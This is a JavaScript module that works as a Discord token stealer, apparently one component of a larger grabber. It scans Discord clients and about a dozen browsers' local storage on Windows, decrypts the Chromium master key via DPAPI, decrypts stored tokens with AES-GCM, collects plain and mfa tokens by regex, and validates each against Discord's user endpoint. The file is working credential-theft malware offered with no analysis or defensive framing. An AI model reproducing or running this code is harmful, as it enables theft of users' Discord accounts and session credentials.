const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { unprotectData } = require('datavault-win');
const https = require('https');

/**
 * Validates a Discord token by making a GET request to the @me endpoint.
 * @param {string} token - The Discord token to validate.
 * @returns {Promise<Object|null>} - User info if valid, null otherwise.
 */
async function validateToken(token) {
    return new Promise((resolve) => {
        const options = {
            hostname: 'discord.com',
            path: '/api/v9/users/@me',
            method: 'GET',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try {
                        resolve(JSON.parse(data));
                    } catch (e) {
                        resolve(null);
                    }
                } else {
                    resolve(null);
                }
            });
        });

        req.on('error', () => resolve(null));
        req.end();
    });
}

/**
 * Decrypts a v10 Discord token using the master key from Local State.
 * @param {Buffer} buffer - The encrypted token blob.
 * @param {Buffer} masterKey - The decrypted master key.
 * @returns {string|null} - Decrypted token or null.
 */
function decryptToken(buffer, masterKey) {
    try {
        const iv = buffer.slice(3, 15);
        const ciphertext = buffer.slice(15, buffer.length - 16);
        const tag = buffer.slice(buffer.length - 16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
        decipher.setAuthTag(tag);
        
        return Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString();
    } catch (e) {
        return null;
    }
}

/**
 * Extracts Discord tokens from a given LevelDB directory.
 * @param {string} leveldbPath - Path to the LevelDB directory.
 * @param {Buffer} [masterKey] - Optional master key for decryption.
 * @returns {Promise<string[]>} - List of found tokens.
 */
async function extractFromLevelDb(leveldbPath, masterKey) {
    const tokens = new Set();
    try {
        if (!(await fs.pathExists(leveldbPath))) return [];
        
        const files = await fs.readdir(leveldbPath);
        for (const file of files) {
            if (file.endsWith('.ldb') || file.endsWith('.log')) {
                const content = await fs.readFile(path.join(leveldbPath, file), 'utf-8');
                
                // Unencrypted tokens
                const unencryptedMatch = content.match(/[a-zA-Z0-9\-_]{24}\.[a-zA-Z0-9\-_]{6}\.[a-zA-Z0-9\-_]{27}/g);
                if (unencryptedMatch) unencryptedMatch.forEach(t => tokens.add(t));
                
                const unencryptedMatch2 = content.match(/mfa\.[a-zA-Z0-9\-_]{84}/g);
                if (unencryptedMatch2) unencryptedMatch2.forEach(t => tokens.add(t));

                // Encrypted tokens (v10)
                if (masterKey) {
                    const encryptedMatch = content.match(/dQw4w9WgXcQ:[^.*\['"]*/g);
                    if (encryptedMatch) {
                        for (let enc of encryptedMatch) {
                            const encryptedBuffer = Buffer.from(enc.split('dQw4w9WgXcQ:')[1], 'base64');
                            const decrypted = decryptToken(encryptedBuffer, masterKey);
                            if (decrypted) tokens.add(decrypted);
                        }
                    }
                }
            }
        }
    } catch (e) {}
    return Array.from(tokens);
}

/**
 * Main entry point for Discord token extraction across all targeted browsers/clients.
 * @returns {Promise<string[]>} - List of unique tokens.
 */
async function extractDiscordTokens() {
    const roaming = process.env.APPDATA;
    const local = process.env.LOCALAPPDATA;
    
    const targets = [
        { name: 'Discord', path: path.join(roaming, 'discord') },
        { name: 'Discord Canary', path: path.join(roaming, 'discordcanary') },
        { name: 'Discord PTB', path: path.join(roaming, 'discordptb') },
        { name: 'Lightcord', path: path.join(roaming, 'Lightcord') },
        { name: 'Brave', path: path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data') },
        { name: 'Chrome', path: path.join(local, 'Google', 'Chrome', 'User Data') },
        { name: 'Chrome SxS', path: path.join(local, 'Google', 'Chrome SxS', 'User Data') },
        { name: 'Edge', path: path.join(local, 'Microsoft', 'Edge', 'User Data') },
        { name: 'Opera', path: path.join(roaming, 'Opera Software', 'Opera Stable') },
        { name: 'Opera GX', path: path.join(roaming, 'Opera Software', 'Opera GX Stable') },
        { name: 'Vivaldi', path: path.join(local, 'Vivaldi', 'User Data') },
        { name: 'Yandex', path: path.join(local, 'Yandex', 'YandexBrowser', 'User Data') }
    ];

    const allTokens = new Set();

    for (const target of targets) {
        try {
            const localStatePath = path.join(target.path, 'Local State');
            let masterKey = null;

            if (await fs.pathExists(localStatePath)) {
                const localState = await fs.readJson(localStatePath);
                const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
                const decryptedKey = unprotectData(encryptedKey.slice(5)); // Remove 'DPAPI' prefix
                masterKey = decryptedKey;
            }

            // Standard profile path
            const leveldbPath = path.join(target.path, target.name.includes('Opera') ? 'Network' : 'Default', 'Local Storage', 'leveldb');
            const found = await extractFromLevelDb(leveldbPath, masterKey);
            found.forEach(t => allTokens.add(t));
            
            // Check Profile 1, 2, 3...
            for (let i = 1; i <= 5; i++) {
                const profilePath = path.join(target.path, `Profile ${i}`, 'Local Storage', 'leveldb');
                const pFound = await extractFromLevelDb(profilePath, masterKey);
                pFound.forEach(t => allTokens.add(t));
            }
        } catch (e) {}
    }

    return Array.from(allTokens);
}

module.exports = {
    extractDiscordTokens,
    validateToken
};